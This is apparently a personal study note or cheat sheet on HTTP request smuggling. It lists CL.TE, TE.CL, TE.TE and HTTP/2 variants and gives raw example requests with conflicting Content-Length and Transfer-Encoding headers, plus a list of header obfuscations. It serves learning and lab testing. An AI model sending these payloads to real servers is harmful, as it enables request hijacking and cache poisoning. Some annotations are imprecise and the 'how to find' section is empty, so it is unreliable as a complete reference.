# HTTP Request Smuggling

## Types:

1. HTTP/1.1
    1. CL.TE
    2. TE.CL
    3. TE.TE
3. HTTP/2

## How to find each type:

1. HTTP/1.1
    1. CL.TE
    2. TE.CL
    3. TE.TE

## How to exploit each type:

1. HTTP/1.1
    1. CL.TE
       ```
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Length: 13               --> Content length is 13 which includes smuggled
       Transfer-Encoding: chunked    

       0  --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend

       SMUGGLED               
       ```
    2. TE.CL
         ```
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Length: 3               --> Content length is 3 which includes the 8
       Transfer-Encoding: chunked    

       8  --> This is the length of the following request
       SMUGGLED
       0   --> Needs to end in /r/n/r/n
       ```
    3. TE.TE
       - You need to obfuscate the Transfer-Encoding header so that one server does not process it
        ```
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked
        Transfer-Encoding
        : chunked
       ```

## Other important notes:
- HTTP/1.1 allows for content-length transfer-encoding
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
- HTTP/2 is only vulnerable if the backend supports HTTP/1.1
- You need to manually switch the protocol in repeater
